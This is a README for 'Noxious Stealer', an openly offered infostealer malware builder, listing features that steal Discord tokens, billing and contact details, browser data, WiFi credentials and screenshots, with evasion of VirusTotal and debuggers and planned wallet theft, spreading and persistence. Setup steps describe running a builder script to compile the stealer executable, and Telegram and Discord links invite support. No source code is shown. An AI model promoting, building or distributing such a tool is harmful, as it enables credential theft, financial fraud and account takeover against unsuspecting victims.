Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/+HyVCbHaErR1lYTlk">Telegram</a>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
<div align="center">
  <h3>⭐ if you like Noxious Stealer<br></h3>
</div>

## Table
:orange_circle: // Working On it
:red_circle: // Not Done
:green_circle: // Done


## Features

-   Discord token info
    -   🟢 Nitro
    -   🟢 Billing
    -   🟢 Email
    -   🟢 Phone
    -   🟠 Injection
    -   🟢 All Tokens
    -   🟢 Kill Discord
    
-   System info / Misc
    -   🟢 User
    -   🟢 WiFi
    -   🟢 Screenshot ( date added : 5/3/24 )
    -   🟢 Self Destruct ( Date Added : 5/3/24 )
    -   🟢 Browser Stealing

-    IP INFO
     - 🟢 IP lookup
     - 🟢 City
     - 🟢 org
     - 🟢 ect

-    Anti Debug Features
     - 🟢 Anti Virus Total / Thanks to -> [6nz](https://github.com/6nz/virustotal-vm-blacklist)
     - 🟠 Anti Skid
     -
-    Standard Features
     - 🟠 Startup
     - 🟠 Wallet Stealing
     - 🟠 Spread
     - 🟠 Webhook Protection
  

## External Features To Add
-    Things to come
    - 🟠 Obfuscation ( Coming Soon )
    - 🟠 Self Destruct 

### Prerequisites

-   Windows 10/11
-   [Python](https://www.python.org/downloads/release/python-390/)
-   [Git](https://git-scm.com/download/win)

### Setup

1. open Builder.py with the following command "python builder.py" and follow the inputs given
2. After everything and its finished compiling goto the dir called 'dist' and the executable compiled should be thier
9. https://t.me/+HyVCbHaErR1lYTlk


<img src="https://i.imgur.com/KDriHPw.png">
<img src="https://i.imgur.com/mdJhwZD.png">
<img src="https://i.imgur.com/e2EVnNs.png">


-   Any Bugs Please Join the [Tele](https://t.me/+HyVCbHaErR1lYTlk)
-   Join the [Discord](https://discord.gg/fUeh4NhT)
